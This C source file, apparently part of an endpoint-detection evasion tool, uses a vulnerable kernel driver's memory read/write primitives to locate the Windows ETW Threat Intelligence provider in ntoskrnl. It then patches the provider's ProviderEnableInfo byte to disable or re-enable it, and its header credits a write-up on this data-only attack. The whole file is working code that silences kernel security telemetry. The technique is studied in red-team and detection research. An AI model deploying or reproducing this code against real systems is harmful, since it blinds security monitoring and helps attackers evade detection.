/*

--- ETW Threat Intelligence operations.
--- Inspiration and credit: https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider

*/

#include <Windows.h>
#include <Tchar.h>

#include "ETWThreatIntel.h"
#include "KernelMemoryPrimitives.h"
#include "NtoskrnlOffsets.h"

DWORD64 GetEtwThreatIntProvRegHandleAddress() {
    if (ntoskrnlOffsets.st.etwThreatIntProvRegHandle == 0x0) {
        return 0x0;
    }

    DWORD64 Ntoskrnlbaseaddress = FindNtoskrnlBaseAddress();
    return Ntoskrnlbaseaddress + ntoskrnlOffsets.st.etwThreatIntProvRegHandle;
}

DWORD64 GetEtwThreatInt_ProviderEnableInfoAddress(BOOL verbose) {
    if (ntoskrnlOffsets.st.etwThreatIntProvRegHandle == 0x0 || ntoskrnlOffsets.st.etwRegEntry_GuidEntry == 0x0 || ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo == 0x0) {
        _tprintf(TEXT("[!] ETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel.\n"));
        return 0x0;
    }

    HANDLE Device = GetDriverHandle();
    DWORD64 etwThreatIntProvRegHandleAddress = GetEtwThreatIntProvRegHandleAddress();

    DWORD64 etwThreatInt_ETW_REG_ENTRYAddress = ReadMemoryDWORD64(Device, etwThreatIntProvRegHandleAddress);
    if (verbose) {
        _tprintf(TEXT("[+] Found ETW Threat Intel provider _ETW_REG_ENTRY at 0x%I64x\n"), etwThreatInt_ETW_REG_ENTRYAddress);
    }
    DWORD64 etwThreatInt_ETW_GUID_ENTRYAddress = ReadMemoryDWORD64(Device, etwThreatInt_ETW_REG_ENTRYAddress + ntoskrnlOffsets.st.etwRegEntry_GuidEntry);
    
    CloseHandle(Device);

    return etwThreatInt_ETW_GUID_ENTRYAddress + ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo;
}

void EnableDisableETWThreatIntelProvider(BOOL verbose, BOOL enable) {
    DWORD64 etwThreatInt_ProviderEnableInfoAddress = GetEtwThreatInt_ProviderEnableInfoAddress(verbose);
    if (etwThreatInt_ProviderEnableInfoAddress == 0x0) {
        return;
    }

    _tprintf(TEXT("[*] Attempting to %s the ETW Threat Intel provider by patching ProviderEnableInfo at 0x%I64x with 0x%02X.\n"), 
        enable ? TEXT("(re)enable") : TEXT("disable"), etwThreatInt_ProviderEnableInfoAddress, enable ? ENABLE_PROVIDER : DISABLE_PROVIDER);
    HANDLE Device = GetDriverHandle();
    WriteMemoryBYTE(Device, etwThreatInt_ProviderEnableInfoAddress, enable ? ENABLE_PROVIDER : DISABLE_PROVIDER);

    BOOL finalState = isETWThreatIntelProviderEnabled(verbose);
    if (finalState == enable) {
        _tprintf(TEXT("[+] The ETW Threat Intel provider was successfully %s!\n"), enable ? TEXT("enabled") : TEXT("disabled"));
    }
    else {
        _tprintf(TEXT("[!] Failed to %s the ETW Threat Intel provider!\n"), enable ? TEXT("enable") : TEXT("disable"));
    }

    CloseHandle(Device);
}


void DisableETWThreatIntelProvider(BOOL verbose) {
    EnableDisableETWThreatIntelProvider(verbose, FALSE);
}


void EnableETWThreatIntelProvider(BOOL verbose) {
    EnableDisableETWThreatIntelProvider(verbose, TRUE);
}


BOOL isETWThreatIntelProviderEnabled(BOOL verbose) {
    DWORD64 etwThreatInt_ProviderEnableInfoAddress = GetEtwThreatInt_ProviderEnableInfoAddress(verbose);

    if (etwThreatInt_ProviderEnableInfoAddress == 0x0) {
        return FALSE;
    }
    
    HANDLE Device = GetDriverHandle();
    BYTE etwThreatInt_ProviderEnableInfoValue = ReadMemoryBYTE(Device, etwThreatInt_ProviderEnableInfoAddress);
    CloseHandle(Device);

    return etwThreatInt_ProviderEnableInfoValue == ENABLE_PROVIDER;
}